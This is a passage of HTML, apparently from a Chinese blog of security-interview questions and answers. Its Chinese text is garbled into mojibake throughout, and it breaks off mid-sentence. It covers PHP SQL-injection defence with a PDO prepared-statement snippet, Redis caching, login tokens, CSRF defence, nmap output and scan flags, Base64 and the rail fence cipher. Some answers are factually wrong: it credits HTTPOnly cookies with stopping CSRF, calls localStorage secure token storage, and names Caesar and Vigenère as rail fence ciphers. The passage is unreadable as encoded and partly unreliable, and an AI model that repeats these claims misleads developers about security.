title="PHPåœ¨åšSQLæ³¨å…¥é˜²å¾¡æ—¶çš„æ–¹æ³•"></a>PHPåœ¨åšSQLæ³¨å…¥é˜²å¾¡æ—¶çš„æ–¹æ³•</h3><p>åœ¨PHPä¸­ï¼Œé˜²å¾¡SQLæ³¨å…¥çš„æ–¹æ³•åŒ…æ‹¬ï¼š</p><ol><li><p><strong>ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼ˆPreparedStatementï¼‰</strong>ï¼šé€šè¿‡é¢„ç¼–è¯‘è¯­å¥å°†ç”¨æˆ·è¾“å…¥ä¸SQLå‘½ä»¤åˆ†ç¦»ï¼Œé¿å…ç›´æ¥æ‹¼æ¥SQLå­—ç¬¦ä¸²ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE username = :username&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br></pre></td></tr></table></figure></li><li><p><strong>ä½¿ç”¨ORMæ¡†æ¶</strong>ï¼šå¦‚Doctrineã€Eloquentç­‰ï¼Œå®ƒä»¬é€šå¸¸ä¼šæä¾›å®‰å…¨çš„APIæ¥å¤„ç†SQLæŸ¥è¯¢ï¼Œé¿å…ç›´æ¥æ‹¼æ¥SQLã€‚</p></li><li><p><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œé™åˆ¶è¾“å…¥çš„æ ¼å¼å’Œé•¿åº¦ï¼Œç¡®ä¿è¾“å…¥ç¬¦åˆé¢„æœŸã€‚</p></li><li><p><strong>ä½¿ç”¨å®‰å…¨çš„åº“å’Œæ¡†æ¶</strong>ï¼šé€‰æ‹©ç»è¿‡å®‰å…¨å®¡è®¡çš„åº“å’Œæ¡†æ¶ï¼Œå¹¶æ­£ç¡®é…ç½®å®ƒä»¬çš„å®‰å…¨ç›¸å…³é€‰é¡¹ã€‚</p></li><li><p><strong>å®šæœŸæ›´æ–°å’Œæ‰“è¡¥ä¸</strong>ï¼šåŠæ—¶æ›´æ–°æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå’Œç›¸å…³åº“ï¼Œä¿®å¤å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚</p></li><li><p><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šä¸ºæ•°æ®åº“ç”¨æˆ·åˆ†é…æœ€å°å¿…è¦çš„æƒé™ï¼Œé™åˆ¶å…¶åªèƒ½æ‰§è¡Œå¿…è¦çš„æ“ä½œã€‚</p></li></ol><h3 id="Redisè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ"><a href="#Redisè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ" class="headerlink" title="Redisè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ"></a>Redisè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h3><p>Redisä¸»è¦è§£å†³äº†ä»¥ä¸‹é—®é¢˜ï¼š</p><ol><li><strong>é«˜æ€§èƒ½æ•°æ®å­˜å‚¨</strong>ï¼šRedisæ˜¯ä¸€ç§åŸºäºå†…å­˜çš„é”®å€¼å­˜å‚¨ç³»ç»Ÿï¼Œæä¾›äº†æé«˜çš„è¯»å†™æ€§èƒ½ï¼Œé€‚ç”¨äºéœ€è¦å¿«é€Ÿæ•°æ®è®¿é—®çš„åœºæ™¯ã€‚</li><li><strong>ç¼“å­˜</strong>ï¼šé€šè¿‡å°†çƒ­ç‚¹æ•°æ®å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼ŒRediså¯ä»¥æ˜¾è‘—æé«˜åº”ç”¨çš„å“åº”é€Ÿåº¦ï¼Œå‡è½»æ•°æ®åº“çš„è´Ÿè½½ã€‚</li><li><strong>åˆ†å¸ƒå¼é”</strong>ï¼šRediså¯ä»¥ç”¨äºå®ç°åˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„é”æœºåˆ¶ï¼Œç¡®ä¿åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹æ•°æ®çš„ä¸€è‡´æ€§ã€‚</li><li><strong>å®æ—¶æ•°æ®å¤„ç†</strong>ï¼šæ”¯æŒå¤šç§æ•°æ®ç»“æ„ï¼ˆå¦‚å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€é›†åˆç­‰ï¼‰ï¼Œä½¿å¾—Redisåœ¨å¤„ç†å®æ—¶æ•°æ®æ—¶éå¸¸çµæ´»ã€‚</li><li><strong>æ¶ˆæ¯é˜Ÿåˆ—</strong>ï¼šåˆ©ç”¨åˆ—è¡¨å’Œå‘å¸ƒ&#x2F;è®¢é˜…æ¨¡å¼ï¼ŒRediså¯ä»¥ä½œä¸ºç®€å•çš„æ¶ˆæ¯é˜Ÿåˆ—ä½¿ç”¨ã€‚</li><li><strong>æŒä¹…åŒ–å’Œé«˜å¯ç”¨</strong>ï¼šé€šè¿‡RDBï¼ˆå¿«ç…§ï¼‰å’ŒAOFï¼ˆæ—¥å¿—ï¼‰æŒä¹…åŒ–æœºåˆ¶ï¼Œä»¥åŠä¸»ä»å¤åˆ¶å’Œå“¨å…µæœºåˆ¶ï¼ŒRediså¯ä»¥ä¿è¯æ•°æ®çš„æŒä¹…æ€§å’Œé«˜å¯ç”¨æ€§ã€‚</li></ol><h3 id="çƒ­ç‚¹æ•°æ®æ€ä¹ˆä¿è¯Rediså’ŒDBä¸­çš„ä¸€è‡´ï¼Ÿ"><a href="#çƒ­ç‚¹æ•°æ®æ€ä¹ˆä¿è¯Rediså’ŒDBä¸­çš„ä¸€è‡´ï¼Ÿ" class="headerlink" title="çƒ­ç‚¹æ•°æ®æ€ä¹ˆä¿è¯Rediså’ŒDBä¸­çš„ä¸€è‡´ï¼Ÿ"></a>çƒ­ç‚¹æ•°æ®æ€ä¹ˆä¿è¯Rediså’ŒDBä¸­çš„ä¸€è‡´ï¼Ÿ</h3><p>ä¿è¯Redisç¼“å­˜ä¸æ•°æ®åº“ä¸­çƒ­ç‚¹æ•°æ®çš„ä¸€è‡´æ€§ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹ç­–ç•¥ï¼š</p><ol><li><strong>åŒå†™æœºåˆ¶</strong>ï¼šåœ¨æ›´æ–°æ•°æ®åº“çš„åŒæ—¶ï¼ŒåŒæ­¥æ›´æ–°Redisç¼“å­˜ã€‚è¿™å¯ä»¥é€šè¿‡åœ¨ä¸šåŠ¡é€»è¾‘ä¸­åŒæ—¶æ‰§è¡Œæ•°æ®åº“å’ŒRedisçš„å†™æ“ä½œæ¥å®ç°ã€‚</li><li><strong>ç¼“å­˜æ›´æ–°ç­–ç•¥</strong>ï¼šåœ¨æ•°æ®åº“æ›´æ–°åï¼Œä¸»åŠ¨æ›´æ–°æˆ–åˆ é™¤Redisä¸­çš„å¯¹åº”ç¼“å­˜ï¼Œç¡®ä¿ç¼“å­˜æ•°æ®çš„æ—¶æ•ˆæ€§ã€‚</li><li><strong>æ•°æ®åº“è§¦å‘å™¨</strong>ï¼šåˆ©ç”¨æ•°æ®åº“çš„è§¦å‘å™¨ï¼Œåœ¨æ•°æ®å˜æ›´æ—¶è‡ªåŠ¨è§¦å‘ç¼“å­˜æ›´æ–°é€»è¾‘ï¼Œä¿æŒæ•°æ®åŒæ­¥ã€‚</li><li><strong>æ¶ˆæ¯é˜Ÿåˆ—</strong>ï¼šé€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—å¼‚æ­¥å¤„ç†ç¼“å­˜æ›´æ–°ï¼Œå‡å°‘å¯¹ä¸»ä¸šåŠ¡æµç¨‹çš„å½±å“ã€‚</li><li><strong>å®šæœŸåŒæ­¥</strong>ï¼šè®¾ç½®å®šæ—¶ä»»åŠ¡ï¼Œå®šæœŸæ¯”å¯¹æ•°æ®åº“å’ŒRedisä¸­çš„æ•°æ®ï¼Œå‘ç°ä¸ä¸€è‡´æ—¶è¿›è¡Œä¿®æ­£ã€‚</li></ol><h3 id="ç”¨æˆ·ç™»å½•è®¤è¯æ˜¯æ€ä¹ˆåšçš„ï¼Ÿ"><a href="#ç”¨æˆ·ç™»å½•è®¤è¯æ˜¯æ€ä¹ˆåšçš„ï¼Ÿ" class="headerlink" title="ç”¨æˆ·ç™»å½•è®¤è¯æ˜¯æ€ä¹ˆåšçš„ï¼Ÿ"></a>ç”¨æˆ·ç™»å½•è®¤è¯æ˜¯æ€ä¹ˆåšçš„ï¼Ÿ</h3><p>ç”¨æˆ·ç™»å½•è®¤è¯é€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><ol><li><strong>Session-Basedè®¤è¯</strong>ï¼š<ul><li>ç”¨æˆ·ç™»å½•æ—¶ï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªSession IDï¼Œå­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ã€‚</li><li>Session IDé€šè¿‡Cookieå‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯åç»­è¯·æ±‚æºå¸¦è¯¥Session IDä»¥æ ‡è¯†èº«ä»½ã€‚</li><li>æœåŠ¡å™¨é€šè¿‡Session IDæŸ¥æ‰¾å¯¹åº”çš„ç”¨æˆ·ä¿¡æ¯ï¼ŒéªŒè¯ç”¨æˆ·èº«ä»½ã€‚</li></ul></li><li><strong>Token-Basedè®¤è¯ï¼ˆå¦‚JWTï¼‰</strong>ï¼š<ul><li>ç”¨æˆ·ç™»å½•æˆåŠŸåï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªTokenï¼ˆå¦‚JWTï¼‰ï¼ŒåŒ…å«ç”¨æˆ·èº«ä»½ä¿¡æ¯å’Œç­¾åã€‚</li><li>Tokenè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯åœ¨åç»­è¯·æ±‚ä¸­å°†Tokenæ”¾åœ¨è¯·æ±‚å¤´ä¸­å‘é€ç»™æœåŠ¡å™¨ã€‚</li><li>æœåŠ¡å™¨éªŒè¯Tokençš„æœ‰æ•ˆæ€§ï¼Œä»è€Œç¡®è®¤ç”¨æˆ·èº«ä»½ã€‚</li></ul></li><li><strong>OAuth&#x2F;OpenID Connect</strong>ï¼š<ul><li>ç”¨æˆ·é€šè¿‡ç¬¬ä¸‰æ–¹æœåŠ¡ï¼ˆå¦‚Googleã€Facebookï¼‰è¿›è¡Œè®¤è¯ã€‚</li><li>ç¬¬ä¸‰æ–¹æœåŠ¡è¿”å›ä¸€ä¸ªæˆæƒç æˆ–è®¿é—®ä»¤ç‰Œï¼Œç”¨äºè·å–ç”¨æˆ·ä¿¡æ¯ã€‚</li><li>æœåŠ¡å™¨é€šè¿‡éªŒè¯ä»¤ç‰Œæ¥ç¡®è®¤ç”¨æˆ·èº«ä»½ã€‚</li></ul></li></ol><h3 id="Tokençš„å®‰å…¨æ€ä¹ˆä¿æŠ¤ï¼Ÿ"><a href="#Tokençš„å®‰å…¨æ€ä¹ˆä¿æŠ¤ï¼Ÿ" class="headerlink" title="Tokençš„å®‰å…¨æ€ä¹ˆä¿æŠ¤ï¼Ÿ"></a>Tokençš„å®‰å…¨æ€ä¹ˆä¿æŠ¤ï¼Ÿ</h3><p>ä¿æŠ¤Tokençš„å®‰å…¨æ€§å¯ä»¥ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢å…¥æ‰‹ï¼š</p><ol><li><strong>ä½¿ç”¨HTTPS</strong>ï¼šç¡®ä¿Tokenåœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­åŠ å¯†ï¼Œé˜²æ­¢è¢«çªƒå–ã€‚</li><li><strong>Tokençš„çŸ­ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šè®¾ç½®Tokençš„æœ‰æ•ˆæœŸè¾ƒçŸ­ï¼Œè¿‡æœŸåéœ€è¦é‡æ–°è®¤è¯ï¼Œå‡å°‘è¢«æ»¥ç”¨çš„é£é™©ã€‚</li><li><strong>å®‰å…¨å­˜å‚¨</strong>ï¼šå®¢æˆ·ç«¯åº”å°†Tokenå­˜å‚¨åœ¨å®‰å…¨çš„åœ°æ–¹ï¼Œå¦‚ä½¿ç”¨æµè§ˆå™¨çš„localStorageå¹¶è®¾ç½®é€‚å½“çš„æƒé™ã€‚</li><li><strong>é˜²æ­¢XSSæ”»å‡»</strong>ï¼šé€šè¿‡è¾“å…¥éªŒè¯ã€è¾“å‡ºç¼–ç ç­‰æªæ–½é˜²æ­¢XSSæ”»å‡»ï¼Œé¿å…Tokenè¢«æ¶æ„è„šæœ¬çªƒå–ã€‚</li><li><strong>Tokenç»‘å®š</strong>ï¼šå°†Tokenä¸ç‰¹å®šçš„IPåœ°å€ã€è®¾å¤‡æŒ‡çº¹ç­‰ä¿¡æ¯ç»‘å®šï¼Œå¢åŠ å®‰å…¨æ€§ã€‚</li><li><strong>å®šæœŸè½®æ¢</strong>ï¼šå®šæœŸæ›´æ¢Tokenï¼Œå‡å°‘é•¿æœŸä½¿ç”¨åŒä¸€Tokenå¸¦æ¥çš„é£é™©ã€‚</li></ol><h3 id="Tokençš„å†…å®¹è¯¥å¦‚ä½•è®¾è®¡ï¼Ÿ"><a href="#Tokençš„å†…å®¹è¯¥å¦‚ä½•è®¾è®¡ï¼Ÿ" class="headerlink" title="Tokençš„å†…å®¹è¯¥å¦‚ä½•è®¾è®¡ï¼Ÿ"></a>Tokençš„å†…å®¹è¯¥å¦‚ä½•è®¾è®¡ï¼Ÿ</h3><p>Tokençš„è®¾è®¡åº”åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li><strong>ç”¨æˆ·èº«ä»½ä¿¡æ¯</strong>ï¼šå¦‚ç”¨æˆ·IDï¼Œé¿å…å­˜å‚¨æ•æ„Ÿä¿¡æ¯ã€‚</li><li><strong>è¿‡æœŸæ—¶é—´</strong>ï¼šæ˜ç¡®Tokençš„æœ‰æ•ˆæœŸï¼Œä¾¿äºæœåŠ¡å™¨éªŒè¯ã€‚</li><li><strong>ç­¾å</strong>ï¼šä½¿ç”¨æœåŠ¡å™¨çš„ç§é’¥å¯¹Tokenè¿›è¡Œç­¾åï¼Œç¡®ä¿Tokençš„å®Œæ•´æ€§å’Œé˜²ç¯¡æ”¹ã€‚</li><li><strong>å¯é€‰ä¿¡æ¯</strong>ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚ï¼Œå¯åŒ…å«ç”¨æˆ·è§’è‰²ã€æƒé™ç­‰ä¿¡æ¯ã€‚</li></ol><h3 id="æ€ä¹ˆä¿è¯æ•°æ®ä¸è¢«ç¯¡æ”¹å‘¢ï¼Ÿ"><a href="#æ€ä¹ˆä¿è¯æ•°æ®ä¸è¢«ç¯¡æ”¹å‘¢ï¼Ÿ" class="headerlink" title="æ€ä¹ˆä¿è¯æ•°æ®ä¸è¢«ç¯¡æ”¹å‘¢ï¼Ÿ"></a>æ€ä¹ˆä¿è¯æ•°æ®ä¸è¢«ç¯¡æ”¹å‘¢ï¼Ÿ</h3><p>ä¿è¯æ•°æ®ä¸è¢«ç¯¡æ”¹å¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><ol><li><strong>æ•°å­—ç­¾å</strong>ï¼šå¯¹æ•°æ®è¿›è¡Œç­¾åï¼Œæ¥æ”¶æ–¹é€šè¿‡éªŒè¯ç­¾åæ¥ç¡®è®¤æ•°æ®çš„å®Œæ•´æ€§ã€‚</li><li><strong>å“ˆå¸Œæ ¡éªŒ</strong>ï¼šå‘é€æ–¹è®¡ç®—æ•°æ®çš„å“ˆå¸Œå€¼å¹¶å‘é€ç»™æ¥æ”¶æ–¹ï¼Œæ¥æ”¶æ–¹é‡æ–°è®¡ç®—å“ˆå¸Œå€¼è¿›è¡Œæ¯”å¯¹ã€‚</li><li><strong>ä½¿ç”¨å®‰å…¨çš„ä¼ è¾“åè®®</strong>ï¼šå¦‚HTTPSï¼Œç¡®ä¿æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸è¢«ç¯¡æ”¹ã€‚</li><li><strong>æ•°æ®åŠ å¯†</strong>ï¼šå¯¹æ•æ„Ÿæ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œé˜²æ­¢è¢«ç¯¡æ”¹ã€‚</li><li><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼šä¸ºæ•°æ®æ·»åŠ ç‰ˆæœ¬å·ï¼Œé˜²æ­¢æ—§æ•°æ®è¢«æ¶æ„æ›¿æ¢ã€‚</li></ol><h3 id="å¦‚ä½•è¿›è¡ŒCSRFé˜²å¾¡ï¼Ÿ"><a href="#å¦‚ä½•è¿›è¡ŒCSRFé˜²å¾¡ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¿›è¡ŒCSRFé˜²å¾¡ï¼Ÿ"></a>å¦‚ä½•è¿›è¡ŒCSRFé˜²å¾¡ï¼Ÿ</h3><p>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨ç”¨æˆ·çš„æµè§ˆå™¨å‘ç›®æ ‡ç½‘ç«™å‘é€æ¶æ„è¯·æ±‚ï¼Œä»è€Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚ä¸ºäº†é˜²å¾¡CSRFæ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><ol><li><strong>éªŒè¯HTTP Refererå­—æ®µ</strong>ï¼š<ul><li>æ ¹æ®HTTPåè®®ï¼Œ<code>Referer</code>å­—æ®µè®°å½•äº†HTTPè¯·æ±‚çš„æ¥æºåœ°å€ã€‚é€šè¿‡éªŒè¯<code>Referer</code>å­—æ®µï¼Œå¯ä»¥åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„é¡µé¢ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¯·æ±‚çš„<code>Referer</code>å­—æ®µæ˜¯ä»¥ç›®æ ‡ç½‘ç«™çš„åŸŸåå¼€å¤´ï¼Œåˆ™è®¤ä¸ºè¯·æ±‚æ˜¯åˆæ³•çš„ï¼Œå¦åˆ™å¯èƒ½æ˜¯CSRFæ”»å‡»ã€‚</li></ul></li><li><strong>åœ¨è¯·æ±‚ä¸­æ·»åŠ Tokenå¹¶éªŒè¯</strong>ï¼š<ul><li>åœ¨ç”¨æˆ·ç™»å½•åï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªéšæœºçš„Tokenï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ç”¨æˆ·çš„Sessionä¸­ã€‚åœ¨æ¯ä¸ªè¯·æ±‚ä¸­ï¼Œå®¢æˆ·ç«¯éœ€è¦å°†è¿™ä¸ªTokenä½œä¸ºå‚æ•°ï¼ˆå¦‚URLå‚æ•°æˆ–è¡¨å•éšè—å­—æ®µï¼‰å‘é€ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼ŒéªŒè¯è¯·æ±‚ä¸­çš„Tokenæ˜¯å¦ä¸Sessionä¸­çš„Tokenä¸€è‡´ã€‚å¦‚æœä¸ä¸€è‡´ï¼Œåˆ™æ‹’ç»å¤„ç†è¯·æ±‚ã€‚</li></ul></li><li><strong>åœ¨HTTPå¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯</strong>ï¼š<ul><li>é€šè¿‡åœ¨HTTPå¤´ä¸­æ·»åŠ è‡ªå®šä¹‰å±æ€§ï¼ˆå¦‚<code>csrftoken</code>ï¼‰ï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯¥å±æ€§çš„å€¼ï¼Œå¯ä»¥æœ‰æ•ˆé˜²å¾¡CSRFæ”»å‡»ã€‚è¿™ç§æ–¹æ³•å¯ä»¥é¿å…Tokenåœ¨URLä¸­æš´éœ²ï¼Œæé«˜å®‰å…¨æ€§ã€‚</li></ul></li><li><strong>ä½¿ç”¨HTTPOnly Cookie</strong>ï¼š<ul><li>HTTPOnly Cookieæ˜¯ä¸€ç§ç‰¹æ®Šçš„Cookieï¼Œåªèƒ½é€šè¿‡HTTPåè®®è®¿é—®ï¼Œä¸èƒ½é€šè¿‡JavaScriptè®¿é—®ã€‚è¿™å¯ä»¥é˜²æ­¢æ”»å‡»è€…é€šè¿‡JavaScriptè·å–Cookieï¼Œä»è€Œå‡å°‘CSRFæ”»å‡»çš„é£é™©ã€‚</li></ul></li><li><strong>ä½¿ç”¨å®‰å…¨å¤´ä¿¡æ¯</strong>ï¼š<ul><li>é€šè¿‡è®¾ç½®å®‰å…¨å¤´ä¿¡æ¯ï¼ˆå¦‚<code>Content-Security-Policy</code>ï¼‰ï¼Œå¯ä»¥é™åˆ¶æµè§ˆå™¨åªåŠ è½½æ¥è‡ªå¯ä¿¡æºçš„èµ„æºï¼Œä»è€Œé˜²æ­¢æ¶æ„è„šæœ¬çš„æ‰§è¡Œã€‚</li></ul></li></ol><h3 id="æ ¡éªŒä»€ä¹ˆï¼Ÿ"><a href="#æ ¡éªŒä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ ¡éªŒä»€ä¹ˆï¼Ÿ"></a>æ ¡éªŒä»€ä¹ˆï¼Ÿ</h3><p>åœ¨æœåŠ¡å™¨ç«¯ï¼Œéœ€è¦æ ¡éªŒä»¥ä¸‹å†…å®¹ï¼š</p><ol><li><strong>Tokençš„å­˜åœ¨æ€§</strong>ï¼šç¡®ä¿è¯·æ±‚ä¸­åŒ…å«Tokenã€‚</li><li><strong>Tokençš„æ ¼å¼</strong>ï¼šç¡®ä¿Tokençš„æ ¼å¼æ­£ç¡®ã€‚</li><li><strong>Tokençš„ç­¾å</strong>ï¼šéªŒè¯Tokençš„ç­¾åæ˜¯å¦æœ‰æ•ˆï¼Œç¡®ä¿Tokenæœªè¢«ç¯¡æ”¹ã€‚</li><li><strong>Tokençš„è¿‡æœŸæ—¶é—´</strong>ï¼šæ£€æŸ¥Tokenæ˜¯å¦å·²è¿‡æœŸã€‚</li></ol><h3 id="Tokenä¸ºä»€ä¹ˆéœ€è¦åŠ å¯†ï¼Ÿ"><a href="#Tokenä¸ºä»€ä¹ˆéœ€è¦åŠ å¯†ï¼Ÿ" class="headerlink" title="Tokenä¸ºä»€ä¹ˆéœ€è¦åŠ å¯†ï¼Ÿ"></a>Tokenä¸ºä»€ä¹ˆéœ€è¦åŠ å¯†ï¼Ÿ</h3><p>Tokenéœ€è¦åŠ å¯†çš„åŸå› åŒ…æ‹¬ï¼š</p><ol><li><strong>ä¿æŠ¤ç”¨æˆ·éšç§</strong>ï¼šåŠ å¯†å¯ä»¥é˜²æ­¢ç”¨æˆ·èº«ä»½ä¿¡æ¯åœ¨ä¼ è¾“å’Œå­˜å‚¨è¿‡ç¨‹ä¸­è¢«æ³„éœ²ã€‚</li><li><strong>é˜²æ­¢ç¯¡æ”¹</strong>ï¼šåŠ å¯†å’Œç­¾åå¯ä»¥ç¡®ä¿Tokenåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æœªè¢«ç¯¡æ”¹ã€‚</li><li><strong>æé«˜å®‰å…¨æ€§</strong>ï¼šåŠ å¯†å¯ä»¥å¢åŠ æ”»å‡»è€…ä¼ªé€ Tokençš„éš¾åº¦ï¼Œæé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</li></ol><h3 id="æœ‰æ²¡æœ‰è‡ªå·±åŠ¨æ‰‹å†™è¿‡ä¸€äº›å·¥å…·"><a href="#æœ‰æ²¡æœ‰è‡ªå·±åŠ¨æ‰‹å†™è¿‡ä¸€äº›å·¥å…·" class="headerlink" title="æœ‰æ²¡æœ‰è‡ªå·±åŠ¨æ‰‹å†™è¿‡ä¸€äº›å·¥å…·"></a>æœ‰æ²¡æœ‰è‡ªå·±åŠ¨æ‰‹å†™è¿‡ä¸€äº›å·¥å…·</h3><h3 id="nmapæ¢æµ‹ç³»ç»Ÿçš„å‚æ•°æ˜¯ä»€ä¹ˆ-â€”-å¤§å†™è¿˜æ˜¯å°å†™"><a href="#nmapæ¢æµ‹ç³»ç»Ÿçš„å‚æ•°æ˜¯ä»€ä¹ˆ-â€”-å¤§å†™è¿˜æ˜¯å°å†™" class="headerlink" title="nmapæ¢æµ‹ç³»ç»Ÿçš„å‚æ•°æ˜¯ä»€ä¹ˆ â€”&gt;å¤§å†™è¿˜æ˜¯å°å†™"></a>nmapæ¢æµ‹ç³»ç»Ÿçš„å‚æ•°æ˜¯ä»€ä¹ˆ â€”&gt;å¤§å†™è¿˜æ˜¯å°å†™</h3><p>nmapçš„å‚æ•°åŒºåˆ†å¤§å°å†™ï¼Œå¤§éƒ¨åˆ†å‚æ•°æ˜¯å°å†™ï¼Œä½†æœ‰äº›é€‰é¡¹æ˜¯å¤§å†™ï¼Œä¾‹å¦‚ <code>-O</code> ç”¨äºæ“ä½œç³»ç»Ÿæ£€æµ‹ï¼Œ<code>-A</code> ç”¨äºå¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ã€ç‰ˆæœ¬æ£€æµ‹å’Œè„šæœ¬æ‰«æç­‰å¤šç§åŠŸèƒ½ã€‚</p><h3 id="nmapçš„å°å†™oä¸aæ˜¯å¹²å˜›çš„"><a href="#nmapçš„å°å†™oä¸aæ˜¯å¹²å˜›çš„" class="headerlink" title="nmapçš„å°å†™oä¸aæ˜¯å¹²å˜›çš„"></a>nmapçš„å°å†™oä¸aæ˜¯å¹²å˜›çš„</h3><ul><li>**<code>-oN</code>ã€<code>-oX</code>ã€<code>-oS</code>ã€<code>-oG</code>**ï¼šå°†æ‰«æç»“æœä»¥ä¸åŒæ ¼å¼ï¼ˆæ­£å¸¸ã€XMLã€s|&lt;rIpt kIddi3ã€Grepableï¼‰ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ã€‚</li><li>**<code>-oA</code>**ï¼šå°†æ‰«æç»“æœåŒæ—¶ä¿å­˜ä¸ºä¸‰ç§ä¸»è¦æ ¼å¼ï¼ˆæ­£å¸¸ã€XMLã€Grepableï¼‰ã€‚</li><li>**<code>-A</code>**ï¼šå¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ã€ç‰ˆæœ¬æ£€æµ‹ã€è„šæœ¬æ‰«æå’Œè·Ÿè¸ªè·¯ç”±ã€‚</li></ul><h3 id="ä¸€ä¸²ç¼–ç å¦‚ä½•ç¡®è®¤æ˜¯base64"><a href="#ä¸€ä¸²ç¼–ç å¦‚ä½•ç¡®è®¤æ˜¯base64" class="headerlink" title="ä¸€ä¸²ç¼–ç å¦‚ä½•ç¡®è®¤æ˜¯base64"></a>ä¸€ä¸²ç¼–ç å¦‚ä½•ç¡®è®¤æ˜¯base64</h3><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ç¡®è®¤ä¸€ä¸²ç¼–ç æ˜¯å¦æ˜¯Base64ï¼š</p><ol><li><strong>æ£€æŸ¥å­—ç¬¦é›†</strong>ï¼šBase64ç¼–ç çš„å­—ç¬¦é›†ç”±A-Zã€a-zã€0-9ã€<code>+</code>ã€<code>/</code>ç»„æˆï¼Œä¸”é•¿åº¦æ˜¯4çš„å€æ•°ã€‚</li><li><strong>æ£€æŸ¥å¡«å……å­—ç¬¦</strong>ï¼šBase64ç¼–ç é€šå¸¸ä»¥<code>==</code>æˆ–<code>=</code>ç»“å°¾ã€‚</li><li><strong>è§£ç éªŒè¯</strong>ï¼šå°è¯•ä½¿ç”¨Base64è§£ç å·¥å…·è¿›è¡Œè§£ç ï¼Œå¦‚æœè§£ç åå¾—åˆ°å¯è¯»çš„å†…å®¹ï¼Œåˆ™å¾ˆå¯èƒ½æ˜¯Base64ç¼–ç ã€‚</li></ol><h3 id="æ …æ å¯†ç çš„åŸç†æ˜¯ä»€ä¹ˆ"><a href="#æ …æ å¯†ç çš„åŸç†æ˜¯ä»€ä¹ˆ" class="headerlink" title="æ …æ å¯†ç çš„åŸç†æ˜¯ä»€ä¹ˆ"></a>æ …æ å¯†ç çš„åŸç†æ˜¯ä»€ä¹ˆ</h3><p>æ …æ å¯†ç æ˜¯ä¸€ç§ç»å…¸çš„å¯†ç åŠ å¯†æŠ€æœ¯ï¼Œå…¶åŸç†æ˜¯å°†æ˜æ–‡æŒ‰ç…§ä¸€å®šçš„è§„åˆ™è¿›è¡Œæ’åˆ—ç»„åˆï¼Œå½¢æˆå¯†æ–‡ã€‚å¸¸è§çš„æ …æ å¯†ç åŒ…æ‹¬å‡¯æ’’å¯†ç ã€ç»´å‰å°¼äºšå¯†ç ç­‰ã€‚</p><h3 id="base64ä¸md5å¦‚ä½•åŒºåˆ«"><a href="#base64ä¸md5å¦‚ä½•åŒºåˆ«" class="headerlink" title="base64ä¸md5å¦‚ä½•åŒºåˆ«"></a>base64ä¸md5å¦‚ä½•åŒºåˆ«</h3><p>Base64æ˜¯ä¸€ç§ç¼–ç 